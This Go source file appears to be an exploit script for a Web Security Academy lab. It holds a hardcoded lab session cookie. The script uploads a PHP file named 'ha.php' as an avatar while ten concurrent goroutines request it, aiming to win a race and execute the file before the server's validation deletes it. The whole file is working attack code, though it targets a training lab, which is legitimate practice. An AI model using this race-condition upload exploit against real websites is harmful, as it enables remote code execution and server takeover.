package main

import (
	"net/http"
	"sync"
)

var (
	mainUrl = "https://0a7f00810441f40080339ea0003d0039.web-security-academy.net" // should NOT end with "/"
	// mainUrl       = "http://localhost:3333" // should NOT end with "/"
	cookieSession = "session=idebAeFYmGrx52tNUb610I99E6BGEvFp"
	fileName      = "ha.php"
)

func main() {
	var wg sync.WaitGroup

	// get a home page: something like a connection warming request
	makeHttpReq(http.MethodGet, mainUrl, "", "", false)

	wg.Add(1)
	go uploadFile(&wg)

	for i := 0; i < 10; i++ {
		wg.Add(1)
		go getFile(&wg)
	}

	wg.Wait()
}

func uploadFile(wg *sync.WaitGroup) {
	defer wg.Done()

	uploadFileReq(http.MethodPost, mainUrl+"/my-account/avatar")
}

func getFile(wg *sync.WaitGroup) {
	defer wg.Done()

	resp := makeHttpReq(http.MethodGet, mainUrl+"/files/avatars/"+fileName, "", cookieSession, true)
	if resp.StatusCode == http.StatusOK {
		rawHttpLikeOutput(resp, true)
	} else {
		defer resp.Body.Close()
	}
}
